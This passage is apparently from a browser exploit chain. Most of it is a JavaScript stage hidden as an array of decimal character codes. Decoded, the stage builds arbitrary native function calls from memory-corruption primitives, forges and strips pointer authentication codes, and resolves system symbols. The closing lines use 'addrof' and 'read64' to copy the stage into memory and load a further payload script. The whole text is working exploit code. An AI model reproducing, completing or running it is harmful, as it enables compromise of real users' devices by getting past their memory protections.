32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 100, 121, 108, 100, 95, 115, 105, 103, 110, 80, 111, 105, 110, 116, 101, 114, 95, 103, 97, 100, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 95, 105, 110, 112, 117, 116, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 115, 104, 97, 114, 101, 100, 95, 99, 97, 99, 104, 101, 95, 115, 108, 105, 100, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 120, 112, 97, 99, 95, 103, 97, 100, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 105, 100, 120, 32, 42, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 105, 100, 120, 32, 43, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 106, 115, 95, 105, 110, 112, 117, 116, 115, 32, 43, 32, 48, 120, 48, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 106, 115, 95, 105, 110, 112, 117, 116, 115, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 106, 115, 95, 105, 110, 112, 117, 116, 115, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 106, 115, 95, 105, 110, 112, 117, 116, 115, 32, 43, 32, 48, 120, 50, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 102, 99, 97, 108, 108, 95, 119, 114, 97, 112, 112, 101, 114, 32, 61, 32, 34, 34, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 48, 120, 53, 48, 110, 59, 32, 105, 32, 43, 61, 32, 48, 120, 56, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 95, 119, 114, 97, 112, 112, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 105, 41, 46, 104, 101, 120, 80, 108, 97, 105, 110, 40, 41, 32, 43, 32, 102, 99, 97, 108, 108, 95, 119, 114, 97, 112, 112, 101, 114, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 32, 61, 32, 66, 105, 103, 73, 110, 116, 40, 34, 48, 120, 34, 32, 43, 32, 102, 99, 97, 108, 108, 95, 119, 114, 97, 112, 112, 101, 114, 41, 59, 10, 32, 32, 32, 32, 97, 100, 100, 114, 111, 102, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 32, 61, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 68, 101, 98, 117, 103, 58, 32, 119, 114, 105, 116, 101, 32, 116, 111, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 98, 101, 102, 111, 114, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 102, 99, 97, 108, 108, 10, 32, 32, 32, 32, 105, 102, 32, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 33, 61, 32, 48, 110, 32, 38, 38, 32, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 100, 101, 98, 117, 103, 95, 109, 115, 103, 32, 61, 32, 34, 91, 80, 69, 93, 32, 102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 32, 100, 111, 110, 101, 44, 32, 99, 97, 108, 108, 105, 110, 103, 32, 115, 121, 115, 108, 111, 103, 32, 114, 101, 115, 111, 108, 118, 101, 92, 110, 34, 59, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 115, 116, 114, 32, 61, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 100, 101, 98, 117, 103, 95, 109, 115, 103, 41, 59, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 111, 102, 102, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 49, 48, 48, 110, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 104, 32, 61, 32, 117, 114, 101, 97, 100, 56, 40, 99, 115, 116, 114, 32, 43, 32, 105, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 104, 32, 61, 61, 32, 48, 41, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 56, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 111, 102, 102, 32, 43, 32, 105, 44, 32, 99, 104, 41, 59, 10, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 44, 32, 111, 102, 102, 32, 43, 32, 53, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 83, 89, 83, 76, 79, 71, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 108, 111, 103, 34, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 102, 99, 97, 108, 108, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 99, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 44, 32, 112, 99, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 100, 120, 32, 61, 32, 48, 110, 59, 32, 105, 100, 120, 32, 60, 32, 66, 105, 103, 73, 110, 116, 40, 97, 114, 103, 117, 109, 101, 110, 116, 115, 46, 108, 101, 110, 103, 116, 104, 32, 45, 32, 49, 41, 59, 32, 105, 100, 120, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 43, 32, 105, 100, 120, 32, 42, 32, 56, 110, 44, 32, 97, 114, 103, 117, 109, 101, 110, 116, 115, 91, 105, 100, 120, 32, 43, 32, 49, 110, 93, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 105, 115, 78, 97, 78, 40, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 32, 43, 32, 48, 120, 50, 56, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 102, 99, 97, 108, 108, 95, 119, 105, 116, 104, 95, 112, 97, 99, 105, 97, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 99, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 10, 32, 32, 32, 32, 112, 99, 32, 61, 32, 112, 97, 99, 105, 97, 40, 112, 99, 46, 110, 111, 80, 65, 67, 40, 41, 44, 32, 48, 120, 99, 50, 100, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 44, 32, 112, 99, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 100, 120, 32, 61, 32, 48, 110, 59, 32, 105, 100, 120, 32, 60, 32, 66, 105, 103, 73, 110, 116, 40, 97, 114, 103, 117, 109, 101, 110, 116, 115, 46, 108, 101, 110, 103, 116, 104, 32, 45, 32, 49, 41, 59, 32, 105, 100, 120, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 43, 32, 105, 100, 120, 32, 42, 32, 56, 110, 44, 32, 97, 114, 103, 117, 109, 101, 110, 116, 115, 91, 105, 100, 120, 32, 43, 32, 49, 110, 93, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 105, 115, 78, 97, 78, 40, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 95, 119, 114, 97, 112, 112, 101, 114, 32, 43, 32, 48, 120, 50, 56, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 115, 121, 109, 98, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 68, 101, 98, 117, 103, 58, 32, 119, 114, 105, 116, 101, 32, 116, 111, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 98, 101, 102, 111, 114, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 102, 99, 97, 108, 108, 10, 32, 32, 32, 32, 105, 102, 32, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 33, 61, 32, 48, 110, 32, 38, 38, 32, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 100, 101, 98, 117, 103, 95, 109, 115, 103, 32, 61, 32, 34, 91, 80, 69, 93, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 102, 99, 97, 108, 108, 32, 102, 111, 114, 32, 34, 32, 43, 32, 115, 121, 109, 98, 111, 108, 32, 43, 32, 34, 92, 110, 34, 59, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 115, 116, 114, 32, 61, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 100, 101, 98, 117, 103, 95, 109, 115, 103, 41, 59, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 111, 102, 102, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 49, 48, 48, 110, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 104, 32, 61, 32, 117, 114, 101, 97, 100, 56, 40, 99, 115, 116, 114, 32, 43, 32, 105, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 104, 32, 61, 61, 32, 48, 41, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 56, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 111, 102, 102, 32, 43, 32, 105, 44, 32, 99, 104, 41, 59, 10, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 44, 32, 111, 102, 102, 32, 43, 32, 53, 48, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 108, 101, 116, 32, 102, 112, 116, 114, 32, 61, 32, 102, 99, 97, 108, 108, 40, 68, 76, 83, 89, 77, 44, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 115, 121, 109, 98, 111, 108, 41, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 112, 97, 99, 105, 97, 40, 102, 112, 116, 114, 46, 110, 111, 80, 65, 67, 40, 41, 44, 32, 48, 120, 99, 50, 100, 48, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 112, 97, 99, 105, 97, 95, 98, 95, 105, 110, 116, 101, 114, 110, 97, 108, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 116, 114, 44, 32, 99, 116, 120, 44, 32, 107, 101, 121, 95, 116, 121, 112, 101, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 115, 101, 95, 97, 100, 100, 114, 95, 100, 105, 118, 101, 114, 115, 105, 116, 121, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 97, 100, 100, 114, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 105, 102, 32, 40, 99, 116, 120, 32, 62, 62, 32, 49, 54, 110, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 117, 115, 101, 95, 97, 100, 100, 114, 95, 100, 105, 118, 101, 114, 115, 105, 116, 121, 32, 61, 32, 49, 110, 59, 10, 32, 32, 32, 32, 32, 32, 97, 100, 100, 114, 32, 61, 32, 99, 116, 120, 32, 38, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 110, 59, 10, 32, 32, 32, 32, 32, 32, 99, 116, 120, 32, 61, 32, 99, 116, 120, 32, 62, 62, 32, 52, 56, 110, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 100, 121, 108, 100, 95, 115, 105, 103, 110, 80, 111, 105, 110, 116, 101, 114, 95, 103, 97, 100, 103, 101, 116, 44, 32, 112, 116, 114, 44, 32, 97, 100, 100, 114, 44, 32, 117, 115, 101, 95, 97, 100, 100, 114, 95, 100, 105, 118, 101, 114, 115, 105, 116, 121, 44, 32, 99, 116, 120, 44, 32, 107, 101, 121, 95, 116, 121, 112, 101, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 112, 97, 99, 105, 97, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 116, 114, 44, 32, 99, 116, 120, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 112, 97, 99, 105, 97, 95, 98, 95, 105, 110, 116, 101, 114, 110, 97, 108, 40, 112, 116, 114, 44, 32, 99, 116, 120, 44, 32, 48, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 112, 97, 99, 105, 98, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 116, 114, 44, 32, 99, 116, 120, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 112, 97, 99, 105, 97, 95, 98, 95, 105, 110, 116, 101, 114, 110, 97, 108, 40, 112, 116, 114, 44, 32, 99, 116, 120, 44, 32, 49, 110, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 120, 112, 97, 99, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 120, 112, 97, 99, 95, 103, 97, 100, 103, 101, 116, 95, 110, 101, 119, 32, 61, 32, 112, 97, 99, 105, 97, 40, 120, 112, 97, 99, 95, 103, 97, 100, 103, 101, 116, 44, 48, 120, 99, 50, 100, 48, 110, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 120, 112, 97, 99, 95, 103, 97, 100, 103, 101, 116, 95, 110, 101, 119, 44, 32, 112, 116, 114, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 76, 79, 71, 95, 67, 83, 84, 82, 73, 78, 71, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 76, 79, 71, 44, 32, 48, 110, 44, 32, 115, 41, 59, 10, 32, 32, 125, 59, 10, 32, 32, 76, 79, 71, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 109, 115, 103, 32, 61, 32, 115, 59, 10, 32, 32, 32, 32, 32, 32, 91, 93, 91, 109, 115, 103, 93, 59, 10, 32, 32, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 76, 79, 71, 95, 67, 83, 84, 82, 73, 78, 71, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 109, 115, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 125, 59, 10, 32, 32, 112, 114, 105, 110, 116, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 115, 44, 32, 114, 101, 112, 111, 114, 116, 69, 114, 114, 111, 114, 44, 32, 100, 117, 109, 112, 104, 101, 120, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 109, 115, 103, 32, 61, 32, 115, 59, 10, 32, 32, 32, 32, 32, 32, 91, 93, 91, 109, 115, 103, 93, 59, 10, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 115, 116, 114, 32, 61, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 109, 115, 103, 41, 59, 10, 32, 32, 32, 32, 32, 32, 47, 47, 32, 87, 114, 105, 116, 101, 32, 116, 111, 32, 115, 104, 97, 114, 101, 100, 32, 98, 117, 102, 102, 101, 114, 32, 70, 73, 82, 83, 84, 32, 40, 98, 101, 102, 111, 114, 101, 32, 102, 99, 97, 108, 108, 44, 32, 119, 104, 105, 99, 104, 32, 109, 97, 121, 32, 99, 114, 97, 115, 104, 41, 10, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 33, 61, 32, 48, 110, 32, 38, 38, 32, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 32, 33, 61, 32, 48, 110, 32, 38, 38, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 95, 115, 105, 122, 101, 32, 62, 32, 50, 53, 54, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 111, 102, 102, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 111, 102, 102, 32, 43, 32, 50, 53, 54, 110, 32, 60, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 95, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 111, 114, 32, 40, 59, 32, 105, 32, 60, 32, 50, 53, 52, 110, 32, 38, 38, 32, 111, 102, 102, 32, 43, 32, 105, 32, 60, 32, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 95, 115, 105, 122, 101, 32, 45, 32, 50, 110, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 99, 104, 32, 61, 32, 117, 114, 101, 97, 100, 56, 40, 99, 115, 116, 114, 32, 43, 32, 105, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 104, 32, 61, 61, 32, 48, 41, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 56, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 111, 102, 102, 32, 43, 32, 105, 44, 32, 99, 104, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 56, 40, 108, 111, 103, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 111, 102, 102, 32, 43, 32, 105, 44, 32, 48, 120, 48, 97, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 103, 95, 111, 102, 102, 115, 101, 116, 95, 112, 116, 114, 44, 32, 111, 102, 102, 32, 43, 32, 105, 32, 43, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 32, 32, 47, 47, 32, 115, 121, 115, 108, 111, 103, 32, 40, 97, 102, 116, 101, 114, 32, 98, 117, 102, 102, 101, 114, 32, 119, 114, 105, 116, 101, 44, 32, 115, 111, 32, 108, 111, 103, 115, 32, 115, 117, 114, 118, 105, 118, 101, 32, 101, 118, 101, 110, 32, 105, 102, 32, 116, 104, 105, 115, 32, 99, 114, 97, 115, 104, 101, 115, 41, 10, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 83, 89, 83, 76, 79, 71, 44, 32, 48, 110, 44, 32, 99, 115, 116, 114, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 125, 59, 10, 125, 41, 40, 41, 59]);
      pe_stage1_js_data = gpuCopyBuffer(read64(addrof(pe_stage1_js_data_array) + 0x10n), BigInt(pe_stage1_js_data_array.length));
      pe_stage1_js_len = BigInt(pe_stage1_js_data_array.length);
      LOG("[MPD] pe_stage1_js_data copied, len=" + pe_stage1_js_data_array.length);
      let pe_main_js_str = getJS('pe_main_minimal.js?' + Date.now()); // minimal version for MPD
